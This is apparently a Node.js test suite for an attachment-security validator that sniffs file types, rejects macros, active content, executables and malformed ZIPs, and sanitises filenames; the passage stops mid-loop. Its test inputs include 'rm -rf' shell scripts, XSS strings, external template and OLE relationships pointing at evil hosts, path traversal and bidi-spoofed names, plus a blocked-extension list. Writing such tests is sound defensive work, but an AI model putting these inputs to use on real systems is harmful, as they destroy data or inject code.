// attach.test.mjs — `node attach.test.mjs`
// attach-hardening attachment policy (buzz_security ruling): narrow allow-list decided from the BYTES,
// extension forced to the sniffed type, sanitised display names, escaped link labels.
import { deflateRawSync } from "node:zlib";
import { readFileSync, readdirSync } from "node:fs";
import { classifyAttachment, classifyZip, zipDirectory, checkDescriptorMime, attachmentExtFor, parseMediaShaExt, RELAY_MEDIA_EXTS, ZIP_DOCUMENT_MIMES, attachmentDisplayName, sanitizeAttachmentName, escapeLinkLabel, attachmentContentLine, checkAttachmentText, zipCentralDirectoryNames, mediaCapCheck, ATTACH_ALLOWED_FILE_TYPES, ATTACH_IMAGE_MIMES, ATTACH_VIDEO_MIMES, MEDIA_MB } from "./signer.mjs";

let pass = 0, fail = 0;
const ok = (c, m) => (c ? (pass++, console.log("  ✅ " + m)) : (fail++, console.log("  ❌ " + m)));
const reader = (buf) => (start, len) => buf.subarray(start, start + len);
const classify = (name, buf) => classifyAttachment({ name, size: buf.length, read: reader(buf) });
const refused = (name, buf) => { try { classify(name, buf); return null; } catch (e) { return e.message; } };

// A real ZIP with a central directory (what Office/LibreOffice and infer see). Entries are [name, data, opts];
// opts.deflate → method 8 (node zlib), opts.dd → flag bit 3 + a signed data descriptor, opts.localName → a
// local-header name that differs from the central one. zip.comment appends an EOCD comment.
function zip(entries, { comment = "" } = {}) {
  const locals = [], central = [];
  let off = 0;
  for (const [name, data0, o = {}] of entries) {
    const n = Buffer.from(name, "utf8"), ln = Buffer.from(o.localName ?? name, "utf8"), plain = Buffer.from(data0);
    const data = o.deflate ? deflateRawSync(plain) : plain, method = o.deflate ? 8 : 0, flags = o.dd ? 8 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt16LE(method, 8);
    if (!o.dd) { lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(plain.length, 22); }
    lh.writeUInt16LE(ln.length, 26);
    const dd = o.dd ? (() => { const d = Buffer.alloc(16); d.writeUInt32LE(0x08074b50, 0); d.writeUInt32LE(data.length, 8); d.writeUInt32LE(plain.length, 12); return d; })() : Buffer.alloc(0);
    locals.push(lh, ln, data, dd);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8); ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(plain.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(off, 42);
    central.push(ch, n);
    off += 30 + ln.length + data.length + dd.length;
  }
  const cd = Buffer.concat(central), c = Buffer.from(comment, "latin1");
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10); eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(off, 16); eocd.writeUInt16LE(c.length, 20);
  return Buffer.concat([...locals, cd, eocd, c]);
}
const MAIN = { word: "word/document.xml", xl: "xl/workbook.xml", ppt: "ppt/presentation.xml" };
const ooxml = (dir, extra = []) => zip([["[Content_Types].xml", "<Types/>"], ["_rels/.rels", "<Relationships/>"], [MAIN[dir], "<x/>"], ...extra]);
const odf = (mime, extra = [], content = "<office:document-content/>") => zip([["mimetype", mime], ["content.xml", content], ["styles.xml", "<office:document-styles/>"], ["META-INF/manifest.xml", "<manifest:manifest/>"], ...extra]);
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";

console.log("allow-list is exactly the ruling:");
ok(JSON.stringify(ATTACH_ALLOWED_FILE_TYPES.map((t) => t.ext)) === JSON.stringify(["pdf", "docx", "xlsx", "pptx", "odt", "ods", "odp", "txt", "csv", "md", "json"]), "files: pdf docx xlsx pptx odt ods odp txt csv md json");
ok(JSON.stringify(ATTACH_IMAGE_MIMES) === JSON.stringify(["image/jpeg", "image/png", "image/gif", "image/webp"]) && JSON.stringify(ATTACH_VIDEO_MIMES) === JSON.stringify(["video/mp4"]), "media: jpeg png gif webp + mp4 (unchanged)");

console.log("every allowed type is accepted (from its bytes):");
const good = {
  pdf: ["report.pdf", Buffer.from("%PDF-1.7\n1 0 obj\n<<>>\nendobj\n%%EOF\n"), "application/pdf"],
  docx: ["memo.docx", ooxml("word"), DOCX],
  xlsx: ["sheet.xlsx", ooxml("xl"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"],
  pptx: ["deck.pptx", ooxml("ppt"), "application/vnd.openxmlformats-officedocument.presentationml.presentation"],
  odt: ["a.odt", odf("application/vnd.oasis.opendocument.text"), "application/vnd.oasis.opendocument.text"],
  ods: ["a.ods", odf("application/vnd.oasis.opendocument.spreadsheet"), "application/vnd.oasis.opendocument.spreadsheet"],
  odp: ["a.odp", odf("application/vnd.oasis.opendocument.presentation"), "application/vnd.oasis.opendocument.presentation"],
  txt: ["notes.txt", Buffer.from("hello\tworld\r\nline two\n"), "application/octet-stream"],
  csv: ["data.csv", Buffer.from("\ufeffa,b\n1,2\n"), "application/octet-stream"],
  md: ["README.md", Buffer.from("# Title\n\nSome *text* with a [link](https://x).\n"), "application/octet-stream"],
  json: ["cfg.json", Buffer.from('{"a":[1,2,3]}'), "application/octet-stream"],
};
for (const [ext, [name, buf, mime]] of Object.entries(good)) {
  let r = null; try { r = classify(name, buf); } catch (e) { r = { err: e.message }; }
  ok(r && r.mime === mime && r.kind === "file", `${ext} accepted → ${r && (r.mime || r.err)}`);
}
const media = {
  "pic.jpg": [Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10]), "image/jpeg", "image"],
  "pic.png": [Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]), "image/png", "image"],
  "a.gif": [Buffer.from("GIF89a\x01\x00"), "image/gif", "gif"],
  "a.webp": [Buffer.concat([Buffer.from("RIFF"), Buffer.alloc(4), Buffer.from("WEBPVP8 ")]), "image/webp", "image"],
  "clip.mp4": [Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftypisom"), Buffer.alloc(4), Buffer.from("isomavc1")]), "video/mp4", "video"],
};
for (const [name, [buf, mime, kind]] of Object.entries(media)) {
  let r = null; try { r = classify(name, buf); } catch (e) { r = { err: e.message }; }
  ok(r && r.mime === mime && r.kind === kind, `${name} → ${mime} (${kind})`);
}

console.log("rejected — markup, archives, legacy Office, macros, executables:");
const ELF = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(56)]);
const PE = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(58), Buffer.from([0x80, 0, 0, 0]), Buffer.alloc(64), Buffer.from("PE\0\0")]);
const OLE = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(504)]);
const bad = [
  ["page.html", Buffer.from("<!DOCTYPE html><html><script>alert(1)</script></html>"), /unsupported file type/],
  ["page.txt", Buffer.from("<html><body>hi</body></html>"), /markup/],
  ["notes.md", Buffer.from("intro\n<script>alert(1)</script>\n"), /markup/],
  ["logo.svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), /unsupported file type/],
  ["logo.txt", Buffer.from('<?xml version="1.0"?><svg/>'), /markup/],
  ["feed.xml", Buffer.from('<?xml version="1.0"?><rss/>'), /unsupported file type/],
  ["data.json", Buffer.from('  <?xml version="1.0"?>'), /markup/],
  ["bundle.zip", zip([["a.txt", "hi"], ["b.txt", "yo"]]), /zip archive/],
  ["bundle.docx", zip([["a.txt", "hi"]]), /zip archive/],
  ["archive.pdf", Buffer.from([0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0]), /unsupported file type/],
  ["a.7z", Buffer.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 4]), /unsupported file type/],
  ["a.rar", Buffer.from("Rar!\x1a\x07\x01\x00"), /unsupported file type/],
  ["old.doc", OLE, /unsupported file type/],
  ["old.docx", OLE, /unsupported file type/],
  ["macro.docx", ooxml("word", [["word/vbaProject.bin", "\xd0\xcf\x11\xe0"]]), /macros/],
  ["macro.xlsx", ooxml("xl", [["xl/vbaProject.bin", "x"]]), /macros/],
  ["macro.odt", odf("application/vnd.oasis.opendocument.text", [["Basic/Standard/Module1.xml", "x"]]), /macros/],
  ["prog", ELF, /unsupported file type/],
  ["prog.txt", ELF, /control characters|UTF-8/],
  ["invoice.pdf", PE, /unsupported file type/],
  ["run.txt", Buffer.from("#!/bin/sh\nrm -rf /\n"), /script/],
  ["bad.json", Buffer.from("{nope"), /not valid JSON/],
  ["latin1.txt", Buffer.from([0x63, 0x61, 0x66, 0xe9]), /UTF-8/],
  ["clip.mov", Buffer.concat([Buffer.from([0, 0, 0, 0x14]), Buffer.from("ftypqt  "), Buffer.alloc(4), Buffer.from("qt  ")]), /not mp4/],
  ["noext", Buffer.from("plain text"), /must be .txt/],
];
for (const [name, buf, re] of bad) {
  const m = refused(name, buf);
  ok(m && /declined LOCALLY/.test(m) && re.test(m), `${name} refused${m ? " — " + m.split(": unsupported file type ")[1]?.split(")")[0].replace("(", "") : " (WAS ACCEPTED)"}`);
}

console.log("size caps per kind (checked before a whole-file read):");
{
  let reads = 0;
  const hugeZip = { name: "big.docx", size: 101 * MEDIA_MB, read: (s, l) => { reads += l; return Buffer.from([0x50, 0x4b, 3, 4]); } };
  try { classifyAttachment(hugeZip); ok(false, "101 MB docx should throw"); } catch (e) { ok(/100 MB file cap/.test(e.message) && reads <= 4096, `101 MB docx refused after reading only the head (${reads} bytes)`); }
  const pdf60 = { name: "big.pdf", size: 60 * MEDIA_MB, read: () => Buffer.from("%PDF-1.7\n") };
  ok(classifyAttachment(pdf60).mime === "application/pdf", "60 MB pdf passes (100 MB file cap)");
  try { classifyAttachment({ name: "big.png", size: 51 * MEDIA_MB, read: () => Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]) }); ok(false, "51 MB png"); } catch (e) { ok(/50 MB image cap/.test(e.message), "51 MB png refused (50 MB image cap)"); }
  const mp4 = Buffer.concat([Buffer.from([0, 0, 0, 0x10]), Buffer.from("ftypmp42"), Buffer.alloc(4)]);
  ok(classifyAttachment({ name: "v.mp4", size: 400 * MEDIA_MB, read: () => mp4 }).kind === "video", "400 MB mp4 passes (500 MB video cap)");
  ok(mediaCapCheck("evil.png", 60 * MEDIA_MB).kind === "file", "mediaCapCheck never trusts the extension (no MIME → file)");
}

console.log("display names — sanitised, extension forced to the sniffed type:");
ok(attachmentDisplayName("/home/u/Report.PDF", "application/pdf") === "Report.pdf", "Report.PDF → Report.pdf");
ok(attachmentDisplayName("invoice.exe", "application/pdf") === "invoice.pdf", "invoice.exe holding a PDF → invoice.pdf");
ok(attachmentDisplayName("scan", "application/pdf") === "scan.pdf", "no extension → .pdf appended");
ok(attachmentDisplayName("memo.zip", DOCX) === "memo.docx", "memo.zip holding a docx → memo.docx");
ok(attachmentDisplayName("notes.md", "application/octet-stream") === "notes.md" && attachmentDisplayName("data.CSV", "application/octet-stream") === "data.csv", "text keeps txt/csv/md/json (lowercased)");
{ let m = null; try { attachmentDisplayName("x.html", "application/octet-stream"); } catch (e) { m = e.message; } ok(m && /refusing rather than guessing/.test(m), "no .txt fallback: x.html as text → throws"); }
ok(attachmentDisplayName("photo.jpeg", "image/jpeg") === "photo.jpeg" && attachmentDisplayName("photo.png", "image/jpeg") === "photo.jpg", "jpeg keeps jpg/jpeg, else forced to .jpg");
ok(sanitizeAttachmentName("ann\u202Efdp.exe") === "annfdp.exe", "RLO (U+202E) bidi override stripped");
ok(sanitizeAttachmentName("a\u2066b\u2069c\u200Bd\u200Fe\uFEFF\u061C") === "abcde", "LRI/PDI/ZWSP/RLM/BOM/ALM (Cf) stripped");
ok(sanitizeAttachmentName("a\u0000b\u0007c\u001bd\u0085e\u009f") === "abcde", "C0 and C1 controls stripped");
ok(sanitizeAttachmentName("C:\\Users\\x\\..\\secret.pdf") === "secret.pdf" && sanitizeAttachmentName("../../etc/passwd") === "passwd", "/ and \\ never survive (basename)");
ok(sanitizeAttachmentName("  ..hidden.txt.. ") === "hidden.txt" && sanitizeAttachmentName("...") === "file", "dots/spaces trimmed; empty → 'file'");
ok(sanitizeAttachmentName("Cafe\u0301.pdf") === "Caf\u00e9.pdf", "NFC-normalised");
{
  const long = attachmentDisplayName("é".repeat(200) + ".pdf", "application/pdf");
  ok(Buffer.byteLength(long) <= 120 && long.endsWith(".pdf") && !long.includes("\ufffd"), `long names capped at 120 bytes on a char boundary (${Buffer.byteLength(long)} B)`);
}

console.log("posted lines — files are named links with escaped labels; media stay bare URLs:");
ok(escapeLinkLabel("a[b](c)<d>\\e") === "a\\[b\\]\\(c\\)\\<d\\>\\\\e", "escapes \\ [ ] ( ) < >");
ok(attachmentContentLine({ url: "https://m/x.pdf", mime: "application/pdf", filename: "Q3 (final).pdf" }) === "[Q3 \\(final\\).pdf](https://m/x.pdf)", "pdf → [Q3 \\(final\\).pdf](url)");
ok(attachmentContentLine({ url: "https://m/x", mime: "application/pdf", filename: "x](javascript:alert(1))[.pdf" }) === "[x\\]\\(javascript:alert\\(1\\)\\)\\[.pdf](https://m/x)", "a label can't break out of its link");
ok(attachmentContentLine({ url: "https://m/p.png", mime: "image/png", filename: "p.png" }) === "https://m/p.png" && attachmentContentLine({ url: "https://m/v.mp4", mime: "video/mp4", filename: "v.mp4" }) === "https://m/v.mp4", "images and video stay bare URLs (rendered from imeta)");

console.log("helpers:");
ok(JSON.stringify(zipCentralDirectoryNames(zip([["a", "1"], ["b/c", "2"]]))) === '["a","b/c"]', "central directory names read");
ok(zipCentralDirectoryNames(zip([["a", "1"]]).subarray(0, 40)) === null, "truncated zip → null (fail closed)");
try { checkAttachmentText(Buffer.from("ok\n"), "txt"); ok(true, "clean text passes checkAttachmentText"); } catch { ok(false, "clean text passes checkAttachmentText"); }

// ==== review round 1 (buzz_security HOLD) ====
const XLSX_M = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", PPTX_M = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
const ODT_M = "application/vnd.oasis.opendocument.text";
const expectRefused = (name, buf, re, label) => { const m = refused(name, buf); ok(m && /declined LOCALLY/.test(m) && re.test(m), `${label} refused${m ? " — " + (m.match(/unsupported file type \((.*)\)\. Allowed/) || [, m])[1] : " (WAS ACCEPTED)"}`); };
const expectOk = (name, buf, mime, label) => { let r; try { r = classify(name, buf); } catch (e) { r = { err: e.message }; } ok(r && r.mime === mime, `${label} → ${r && (r.mime || r.err)}`); };

console.log("must-fix 2 — strict OOXML/ODF container rules:");
expectRefused("x.docx", zip([["word/x", "hi"], ["payload.exe", "MZ"]]), /zip archive — not a Word/, "word/x + payload.exe (no [Content_Types].xml, no main part)");
expectRefused("x.docx", zip([["[Content_Types].xml", "<Types/>"], ["word/x", "hi"], ["payload.exe", "MZ"]]), /zip archive — not a Word/, "[Content_Types].xml + word/x + payload.exe (no word/document.xml)");
expectRefused("x.docx", zip([["word/document.xml", "<x/>"]]), /zip archive — not a Word/, "word/document.xml without [Content_Types].xml");
expectRefused("x.docx", zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<x/>"], ["xl/workbook.xml", "<x/>"]]), /more than one document type \(docx, xlsx\)/, "docx+xlsx main parts (ambiguous)");
expectRefused("x.odt", ooxml("word", [["mimetype", ODT_M], ["content.xml", "<c/>"], ["META-INF/manifest.xml", "<m/>"]]), /more than one document type/, "OOXML + ODF in one zip (ambiguous)");
expectRefused("a.odt", zip([["mimetype", ODT_M], ["content.xml", "<c/>"]]), /zip archive — not a Word/, "ODF without META-INF/manifest.xml");
expectRefused("a.odt", zip([["mimetype", ODT_M], ["META-INF/manifest.xml", "<m/>"]]), /zip archive — not a Word/, "ODF without content.xml");
expectRefused("a.odt", odf(ODT_M + "x"), /zip archive — not a Word/, "ODF mimetype not an exact odt/ods/odp value");
expectRefused("a.odt", odf("application/vnd.oasis.opendocument.graphics"), /zip archive — not a Word/, "ODF graphics (odg) mimetype");
expectRefused("a.odt", zip([["mimetype", ODT_M, { deflate: true }], ["content.xml", "<c/>"], ["META-INF/manifest.xml", "<m/>"]]), /zip archive — not a Word/, "ODF mimetype entry deflated (must be stored)");
expectOk("m.docx", zip([["[content_types].xml", "<Types/>"], ["Word/Document.xml", "<x/>"]]), DOCX, "OPC part names are case-insensitive");
expectOk("d.docx", zip([["[Content_Types].xml", "<Types/>", { deflate: true, dd: true }], ["word/document.xml", "<w:document/>", { deflate: true, dd: true }]]), DOCX, "deflated entries with data descriptors");

console.log("should-fix — fake/inconsistent ZIP directories:");
{
  const real = ooxml("word");
  // A second EOCD hidden in the comment that re-points the directory at a "plain" one.
  const fake = Buffer.alloc(22); fake.writeUInt32LE(0x06054b50, 0);
  expectRefused("f.docx", zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<x/>"]], { comment: "note:" + fake.toString("latin1") }), /unreadable or inconsistent directory/, "second (fake) EOCD in the comment");
  expectRefused("f.docx", Buffer.concat([real, Buffer.from("trailing")]), /unreadable or inconsistent directory/, "bytes after the EOCD comment");
  // A hidden local entry (vbaProject-free name) not listed in the central directory: splice a local header in front.
  const hidden = zip([["xl/x.bin", "MZ"]]).subarray(0, 30 + 8 + 2);
  const shifted = (() => { const z = Buffer.from(real); const eo = z.length - 22; let at = z.readUInt32LE(eo + 16); z.writeUInt32LE(at + hidden.length, eo + 16); for (let i = 0; i < z.readUInt16LE(eo + 10); i++) { z.writeUInt32LE(z.readUInt32LE(at + 42) + hidden.length, at + 42); at += 46 + z.readUInt16LE(at + 28) + z.readUInt16LE(at + 30) + z.readUInt16LE(at + 32); } return Buffer.concat([hidden, z]); })();
  expectRefused("h.docx", shifted, /unreadable or inconsistent directory/, "hidden local entry not in the central directory");
  // …and one spliced in AFTER the last listed entry, just before the central directory.
  const tail = (() => { const z = Buffer.from(real); const eo = z.length - 22, cdOff = z.readUInt32LE(eo + 16); const out = Buffer.concat([z.subarray(0, cdOff), hidden, z.subarray(cdOff)]); out.writeUInt32LE(cdOff + hidden.length, out.length - 22 + 16); return out; })();
  expectRefused("h.docx", tail, /unreadable or inconsistent directory/, "hidden local entry between the last listed entry and the directory");
  expectRefused("n.docx", zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<x/>", { localName: "word/evil.exe" }]]), /unreadable or inconsistent directory/, "central/local name mismatch");
  expectRefused("d.docx", zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<x/>"], ["WORD/document.xml", "<y/>"]]), /unreadable or inconsistent directory/, "duplicate (case-insensitive) entry names");
  // A local header for Basic/… carried INSIDE a stored part (consistent directory; only the raw scan sees it).
  const inner = zip([["Basic/Standard/Module1.xml", "Sub X"]]).subarray(0, 30 + 26 + 5);
  expectRefused("b.odt", odf(ODT_M, [["Pictures/blob.bin", inner]]), /macros \(Basic\/Standard\/Module1\.xml\)/, "raw Basic/ local header hidden inside another part");
  ok(Array.isArray(zipDirectory(real)) && zipDirectory(real).length === 3, "a consistent zip still parses (3 entries)");
}

console.log("should-fix — active content in OOXML/ODF:");
expectRefused("ax.docx", ooxml("word", [["word/activeX/activeX1.xml", "<ax/>"]]), /ActiveX/, "word/activeX/activeX1.xml");
expectRefused("ax.xlsx", ooxml("xl", [["xl/activeX/activeX1.bin", "x"]]), /ActiveX/, "xl/activeX/activeX1.bin");
expectRefused("ole.docx", ooxml("word", [["word/embeddings/oleObject1.bin", "x"]]), /embedded OLE object/, "word/embeddings/oleObject1.bin");
expectRefused("ole.pptx", ooxml("ppt", [["ppt/embeddings/Microsoft_Word_97.bin", "x"]]), /embedded OLE object/, "ppt/embeddings/*.bin");
expectOk("emb.docx", ooxml("word", [["word/embeddings/chart.xlsx", "x"], ["word/media/image1.png", "x"]]), DOCX, "embedded .xlsx/media (not .bin, not oleObject) still allowed");
{
  const ATT = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
  const rel = (attrs) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" ${attrs}/></Relationships>`;
  expectRefused("t.docx", ooxml("word", [["word/_rels/settings.xml.rels", rel(`Type="${ATT}" Target="https://evil.example/t.dotm" TargetMode="External"`), { deflate: true }]]), /external attachedTemplate reference/, "external attachedTemplate rel (deflated part)");
  expectRefused("t.docx", ooxml("word", [["word/_rels/settings.xml.rels", rel(`TargetMode='External' Target="\\\\evil\\share\\t.dotm" Type='${ATT}'`)]]), /external attachedTemplate/, "external attachedTemplate rel (single quotes, attrs reordered, UNC target)");
  expectRefused("t.docx", ooxml("word", [["word/_rels/settings.xml.rels", rel(`Type="${ATT.replace("attached", "&#97;ttached")}" Target="x" TargetMode="&#69;xternal"`), { deflate: true }]]), /external attachedTemplate/, "entity-encoded &#69;xternal / &#97;ttachedTemplate");
  expectRefused("o.docx", ooxml("word", [["word/_rels/document.xml.rels", rel(`Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="file:///c:/x.bin" TargetMode="External"`)]]), /external oleObject/, "external oleObject rel");
  expectRefused("f.docx", ooxml("word", [["word/_rels/webSettings.xml.rels", rel(`Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="https://evil/x" TargetMode="External"`)]]), /external frame/, "external frame rel");
  expectOk("link.docx", ooxml("word", [["word/_rels/document.xml.rels", rel(`Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"`), { deflate: true }]]), DOCX, "external hyperlink rel still allowed");
  expectOk("tpl.docx", ooxml("word", [["word/_rels/settings.xml.rels", rel(`Type="${ATT}" Target="Normal.dotm"`)]]), DOCX, "internal (non-External) attachedTemplate still allowed");
  const broken = ooxml("word", [["word/_rels/document.xml.rels", "x"]]);
  // corrupt a deflated .rels so it can't be inflated → fail closed
  const bad = zip([["[Content_Types].xml", "<Types/>"], ["word/document.xml", "<x/>"], ["word/_rels/document.xml.rels", "<Relationships/>", { deflate: true }]]);
  const relAt = bad.indexOf(Buffer.from("word/_rels/document.xml.rels")) + "word/_rels/document.xml.rels".length; bad[relAt] = 0xff; bad[relAt + 1] = 0xff;
  expectRefused("c.docx", bad, /unreadable (relationships part|entry)/, "un-inflatable .rels → fail closed");
  ok(classify("plain.docx", broken).mime === DOCX, "(control) a stored non-XML .rels with no Relationship is fine");
}
expectRefused("ev.odt", odf(ODT_M, [], `<office:document-content><office:event-listeners><script:event-listener script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main"/></office:event-listeners></office:document-content>`), /event listeners.*\(content\.xml\)/, "ODF office:event-listeners in content.xml");
expectRefused("ev.odt", zip([["mimetype", ODT_M], ["content.xml", "<c/>", { deflate: true }], ["styles.xml", "<office:document-styles><office:event-listeners/></office:document-styles>", { deflate: true }], ["META-INF/manifest.xml", "<m/>"]]), /event listeners.*\(styles\.xml\)/, "ODF office:event-listeners in styles.xml (deflated)");
expectRefused("ev.odt", odf(ODT_M, [], `<text:a xlink:href="macro:///Standard.Module1.Main">x</text:a>`), /referencing a macro/, "ODF macro:// link");

console.log("round 2 — executables / scripts inside OOXML/ODF containers:");
{
  const MZ = Buffer.concat([Buffer.from("MZ\x90\x00", "latin1"), Buffer.alloc(60)]);
  const ELF = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(56)]);
  expectRefused("v.docx", ooxml("word", [["payload.exe", MZ]]), /executable or script \(payload\.exe\)/, "valid docx + payload.exe");
  expectRefused("v.docx", ooxml("word", [["word/x", "hi"], ["payload.exe", "MZ"]]), /executable or script/, "valid docx + word/x + payload.exe (the review case, now with a main part)");
  expectRefused("v.docx", ooxml("word", [["word/media/image1.png", MZ]]), /Windows executable \(MZ\).*image1\.png/, "MZ blob under a harmless name (stored)");
  expectRefused("v.docx", ooxml("word", [["word/media/image1.png", MZ, { deflate: true }]]), /Windows executable \(MZ\)/, "MZ blob under a harmless name (deflated)");
  expectRefused("v.xlsx", ooxml("xl", [["xl/media/blob.dat", ELF, { deflate: true }]]), /ELF executable/, "ELF blob (deflated)");
  expectRefused("v.pptx", ooxml("ppt", [["ppt/media/x.bin2", Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1])]]), /Mach-O executable/, "Mach-O 64-bit LE (feedfacf) blob");
  expectRefused("v.pptx", ooxml("ppt", [["ppt/media/x.bin2", Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0, 0, 0, 7])]]), /Mach-O executable/, "Mach-O 32-bit BE (feedface) blob");
  expectRefused("v.pptx", ooxml("ppt", [["ppt/media/fat", Buffer.from([0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 2])]]), /Mach-O universal/, "cafebabe (fat / class) blob");
  expectRefused("v.odt", odf(ODT_M, [["Pictures/run", "#!/bin/sh\nrm -rf ~\n", { deflate: true }]]), /script \(#!\)/, "ODF entry starting #! (deflated)");
  for (const ext of ["dll", "com", "scr", "bat", "cmd", "ps1", "vbs", "js", "jse", "wsf", "msi", "jar", "sh", "dmg", "lnk", "hta", "cpl", "pif"]) {
    expectRefused("v.docx", ooxml("word", [[`word/media/x.${ext}`, "harmless"]]), /executable or script/, `entry *.${ext}`);
  }
  expectRefused("v.docx", ooxml("word", [["Tool.app/Contents/Info.plist", "<plist/>"]]), /executable or script/, "*.app bundle directory");
  expectRefused("v.docx", ooxml("word", [["WORD/MEDIA/X.EXE", "harmless"]]), /executable or script/, "upper-case .EXE");
  expectRefused("v.odt", odf(ODT_M, [["Thumbnails/x.vbs", "MsgBox 1"]]), /executable or script/, "ODF entry *.vbs");
  {
    const z = ooxml("word", [["word/media/a.png", "harmless"]]);
    const i = z.indexOf(Buffer.from("word/media/a.png")); // rename only the LOCAL header name → raw scan sees .exe
    const z2 = Buffer.from(z); z2.write("word/media/a.exe", i, "latin1");
    expectRefused("v.docx", z2, /executable|inconsistent/, "local-header-only .exe name");
  }
  expectOk("ok.docx", ooxml("word", [["word/media/image1.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), { deflate: true }], ["word/media/x.json", "{}"], ["word/media/m.xml", "<M/>"]]), DOCX, "(control) png / json / xml parts still allowed");
  expectOk("ok.docx", ooxml("word", [["word/media/empty.png", ""]]), DOCX, "(control) empty entry allowed");
}

console.log("should-fix — whole-file text scan + new markers:");
for (const mk of ["<object data=x>", "<embed src=x>", "<meta http-equiv=refresh>", "<link rel=import>", "<style>x{}</style>", "javascript:alert(1)", "<SCRIPT>"]) {
  const t = Buffer.from("a".repeat(5000) + "\n" + mk + "\n");
  expectRefused("n.md", t, /HTML\/XML markup/, `${JSON.stringify(mk)} past the first 1 KiB of a .md`);
}
expectRefused("n.txt", Buffer.from("x\n".repeat(200000) + "<script>1</script>"), /markup \(<script\)/, "<script> at ~400 KB into a .txt");
expectOk("n.md", Buffer.from("# Notes\n" + "plain words, links like https://example.com and a < b > c.\n".repeat(200)), "application/octet-stream", "long clean markdown still accepted");

console.log("should-fix — filenames (Windows reserved names, invisible separators/fillers):");
ok(attachmentDisplayName("CON.pdf", "application/pdf") === "_CON.pdf", "CON.pdf → _CON.pdf");
ok(attachmentDisplayName("nul", "application/pdf") === "_nul.pdf", "nul → _nul.pdf");
ok(attachmentDisplayName("COM1.txt", "application/octet-stream") === "_COM1.txt", "COM1.txt → _COM1.txt");
ok(attachmentDisplayName("lpt9.tar.pdf", "application/pdf") === "_lpt9.tar.pdf" && attachmentDisplayName("aux .pdf", "application/pdf") === "_aux.pdf", "LPT9.x.pdf / 'aux .pdf' → _-prefixed");
ok(sanitizeAttachmentName("CONIN$") === "_CONIN$" && sanitizeAttachmentName("com\u00b9.txt") === "_com\u00b9.txt", "CONIN$ and COM¹ → _-prefixed");
ok(attachmentDisplayName("console.pdf", "application/pdf") === "console.pdf" && attachmentDisplayName("com10.pdf", "application/pdf") === "com10.pdf" && attachmentDisplayName("my CON.pdf", "application/pdf") === "my CON.pdf", "console / com10 / 'my CON' untouched");
ok(sanitizeAttachmentName("a\u2028b\u2029c.pdf") === "abc.pdf", "U+2028 / U+2029 line/paragraph separators stripped");
ok(sanitizeAttachmentName("\u3164.pdf") === "file" || sanitizeAttachmentName("\u3164x.pdf") === "x.pdf", "U+3164 Hangul filler stripped");
ok(sanitizeAttachmentName("a\u115Fb\u1160c\uFFA0d\u2800e.pdf") === "abcde.pdf", "U+115F / U+1160 / U+FFA0 / U+2800 fillers stripped");
ok(!/[\u3164\u2028]/.test(attachmentDisplayName("\u3164\u3164.pdf", "application/pdf")) && attachmentDisplayName("\u2028.pdf", "application/pdf") === "pdf.pdf", "an all-filler stem leaves no filler (→ pdf.pdf, same as '.pdf')");
{ const long = attachmentDisplayName("CON" + "a".repeat(300) + ".pdf", "application/pdf"); ok(Buffer.byteLength(long) <= 120, `long names still ≤120 B (${Buffer.byteLength(long)} B)`); }

console.log("must-fix 1 — names from the LOCAL classification; descriptor type must agree:");
ok(attachmentExtFor(DOCX, "x.zip") === "docx" && attachmentExtFor("image/png", "a.jpg") === "png" && attachmentExtFor("application/octet-stream", "a.CSV") === "csv", "ext from local type: docx / png / csv");
for (const [mime, nm] of [["application/zip", "a.zip"], ["text/html", "a.html"], ["application/octet-stream", "a.html"], ["application/octet-stream", "noext"], [undefined, "a.pdf"]]) {
